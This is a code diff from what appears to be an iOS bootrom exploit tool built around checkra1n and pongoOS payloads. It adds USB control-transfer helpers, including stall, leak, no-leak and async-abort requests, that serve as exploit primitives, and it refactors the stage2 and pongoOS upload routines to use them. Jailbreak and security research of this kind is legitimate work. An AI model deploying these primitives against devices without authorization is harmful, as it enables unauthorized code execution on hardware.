@@ -107,6 +107,66 @@ static void prog(int sec)
     printf("\n");
 }
 
+transfer_t usb_req_stall(io_client_t client)
+{
+    return usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
+}
+
+transfer_t usb_req_leak(io_client_t client, unsigned char* blank)
+{
+    return usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
+}
+
+transfer_t usb_req_no_leak(io_client_t client, unsigned char* blank)
+{
+    return usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 65, 1);
+}
+
+transfer_t leak(io_client_t client, unsigned char* blank)
+{
+    return usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 192, 1);
+}
+
+transfer_t no_leak(io_client_t client, unsigned char* blank)
+{
+    return usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
+}
+
+transfer_t send_data(io_client_t client, unsigned char* buf, size_t size)
+{
+    return usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, buf, size);
+}
+
+transfer_t send_data_with_time(io_client_t client, unsigned char* buf, size_t size, int timeout)
+{
+    return usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, buf, size, timeout);
+}
+
+transfer_t get_status(io_client_t client, unsigned char* buf, size_t size)
+{
+    return usb_ctrl_transfer(client, 0xa1, 3, 0x0000, 0x0000, buf, size);
+}
+
+transfer_t send_abort(io_client_t client)
+{
+    return usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
+}
+
+transfer_t usb_req_leak_with_async(io_client_t client,
+                                   unsigned char* blank,
+                                   int usleep_time,
+                                   async_transfer_t transfer)
+{
+    transfer_t result = async_usb_ctrl_transfer(client, 0x80, 6, 0x304, 0x40a, blank, 64, &transfer);
+    usleep(usleep_time);
+    io_abort_pipe_zero(client);
+    usleep(usleep_time);
+    while(transfer.ret != kIOReturnAborted){
+        CFRunLoopRun();
+    }
+    return result;
+}
+
 int enter_dfu_via_recovery(io_client_t client)
 {
     LOG("[%s] Waiting for device in Recovery mode...", __FUNCTION__);
@@ -233,7 +293,7 @@ int payload_stage2(io_client_t client, checkra1n_payload_t payload)
         size_t size;
         while(len < payload.stage2_len) {
             size = ((payload.stage2_len - len) > 0x800) ? 0x800 : (payload.stage2_len - len);
-            result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, (unsigned char*)&payload.stage2[len], size);
+            result = send_data(client, (unsigned char*)&payload.stage2[len], size);
             if(result.wLenDone != size || result.ret != kIOReturnSuccess){
                 ERROR("[%s] ERROR: Failed to send stage2 [%x, %x]", __FUNCTION__, result.ret, (unsigned int)result.wLenDone);
                 return -1;
@@ -244,7 +304,7 @@ int payload_stage2(io_client_t client, checkra1n_payload_t payload)
     DEBUGLOG("[%s] (1/2) %x", __FUNCTION__, result.ret);
     usleep(1000);
     
-    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
+    result = send_abort(client);
     DEBUGLOG("[%s] (2/2) %x", __FUNCTION__, result.ret);
     usleep(1000);
     
@@ -278,7 +338,7 @@ int pongo(io_client_t client, checkra1n_payload_t payload)
         size_t size;
         while(len < payload.pongoOS_len) {
             size = ((payload.pongoOS_len - len) > 0x800) ? 0x800 : (payload.pongoOS_len - len);
-            result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, (unsigned char*)&payload.pongoOS[len], size);
+            result = send_data(client, (unsigned char*)&payload.pongoOS[len], size);
             if(result.wLenDone != size || result.ret != kIOReturnSuccess){
                 ERROR("[%s] ERROR: Failed to send pongoOS [%x, %x]", __FUNCTION__, result.ret, (unsigned int)result.wLenDone);
                 return -1;
@@ -290,16 +350,16 @@ int pongo(io_client_t client, checkra1n_payload_t payload)
     DEBUGLOG("[%s] (2/6) %x", __FUNCTION__, result.ret);
     usleep(10000);
     
-    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, NULL, 0);
+    result = send_data(client, NULL, 0);
     DEBUGLOG("[%s] (3/6) %x", __FUNCTION__, result.ret);
     
-    result = usb_ctrl_transfer(client, 0xa1, 3, 0x0000, 0x0000, blank, 8);
+    result = get_status(client, blank, 8);
     DEBUGLOG("[%s] (4/6) %x", __FUNCTION__, result.ret);
 
-    result = usb_ctrl_transfer(client, 0xa1, 3, 0x0000, 0x0000, blank, 8);
+    result = get_status(client, blank, 8);
     DEBUGLOG("[%s] (5/6) %x", __FUNCTION__, result.ret);
 
-    result = usb_ctrl_transfer(client, 0xa1, 3, 0x0000, 0x0000, blank, 8);
+    result = get_status(client, blank, 8);
     DEBUGLOG("[%s] (6/6) %x", __FUNCTION__, result.ret);
     usleep(10000);
     
